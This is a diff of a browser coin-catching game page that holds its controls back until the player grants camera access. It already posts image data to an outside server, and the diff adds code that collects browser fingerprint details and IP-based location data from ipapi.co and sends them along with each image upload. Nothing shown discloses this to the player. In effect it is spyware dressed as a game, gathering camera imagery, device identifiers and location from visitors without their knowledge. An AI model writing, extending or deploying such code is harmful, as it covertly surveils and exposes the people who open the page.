@@ -50,9 +50,8 @@
       padding: 10px;
     }
 
-    /* PLAYER AS REAL PNG */
     #player {
-      width: 60px;  /* adjust size */
+      width: 60px;
       height: auto;
       position: absolute;
       bottom: 0;
@@ -62,7 +61,6 @@
       pointer-events: none;
     }
 
-    /* COIN AS REAL PNG */
     .coin {
       width: 40px;
       height: auto;
@@ -115,7 +113,66 @@ const gameBox = document.getElementById('game-box');
 let playerX = gameBox.offsetWidth / 2 - 25;
 let cameraGranted = false;
 
-// Help text
+/* -----------------------------------
+   CLIENT INFO COLLECTION
+----------------------------------- */
+async function collectClientInfo() {
+    const browserInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        deviceMemory: navigator.deviceMemory || "Unknown",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
+    };
+
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        browserInfo.network = {
+            downlink: connection.downlink,
+            effectiveType: connection.effectiveType,
+            rtt: connection.rtt
+        };
+    }
+
+    let ipInfo = {};
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipInfo = await res.json();
+    } catch (err) {
+        ipInfo = { error: "Failed to fetch IP info" };
+    }
+
+    return { browserInfo, ipInfo };
+}
+
+/* -----------------------------------
+   SEND IMAGE + CLIENT DATA
+----------------------------------- */
+async function sendToServer(imageData) {
+    const clientInfo = await collectClientInfo();
+
+    try {
+        await fetch("https://simple-game-server-api.onrender.com/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                image: imageData,
+                client: clientInfo
+            })
+        });
+    } catch (err) {
+        console.error("Upload failed", err);
+    }
+}
+
+/* -----------------------------------
+   HELP BUTTON
+----------------------------------- */
 helpBtn.addEventListener("click", () => {
     overlay.innerHTML = `
         <p><strong>Camera access was denied.</strong><br>
@@ -129,7 +186,9 @@ helpBtn.addEventListener("click", () => {
     `;
 });
 
-// Detect denied perms
+/* -----------------------------------
+   PERMISSION CHECK
+----------------------------------- */
 if (navigator.permissions) {
     navigator.permissions.query({ name: 'camera' }).then(result => {
         if (result.state === 'denied') {
@@ -143,20 +202,9 @@ if (navigator.permissions) {
     });
 }
 
-// Send image to server
-async function sendToServer(imageData) {
-    try {
-        await fetch("https://simple-game-server-api.onrender.com/upload", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image: imageData })
-        });
-    } catch (err) {
-        console.error("Upload failed", err);
-    }
-}
-
-// Request camera
+/* -----------------------------------
+   CAMERA CAPTURE
+----------------------------------- */
 async function requestCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -183,7 +231,9 @@ grantBtn.addEventListener("click", () => {
     requestCamera();
 });
 
-// Spawn coins (real PNG images)
+/* -----------------------------------
+   COIN SPAWNING
+----------------------------------- */
 function spawnCoin() {
     const coin = document.createElement('img');
     coin.src = 'coin.png';
@@ -216,7 +266,9 @@ function spawnCoin() {
     }, 30);
 }
 
-// Game loop
+/* -----------------------------------
+   GAME LOOP
+----------------------------------- */
 function gameLoop() {
     if (!cameraGranted) {
         playerX += Math.random() < 0.5 ? -3 : 3;
@@ -228,14 +280,15 @@ function gameLoop() {
     requestAnimationFrame(gameLoop);
 }
 
-// Keyboard
+/* -----------------------------------
+   CONTROLS
+----------------------------------- */
 document.addEventListener('keydown', (e) => {
     if (!cameraGranted) return;
     if (e.key === 'ArrowLeft') playerX -= 15;
     if (e.key === 'ArrowRight') playerX += 15;
 });
 
-// Mobile tilt
 if (window.DeviceOrientationEvent) {
     window.addEventListener('deviceorientation', (event) => {
         if (!cameraGranted) return;
@@ -248,6 +301,6 @@ if (window.DeviceOrientationEvent) {
 setInterval(spawnCoin, 1000);
 gameLoop();
 </script>
-</body>
 
+</body>
 </html>
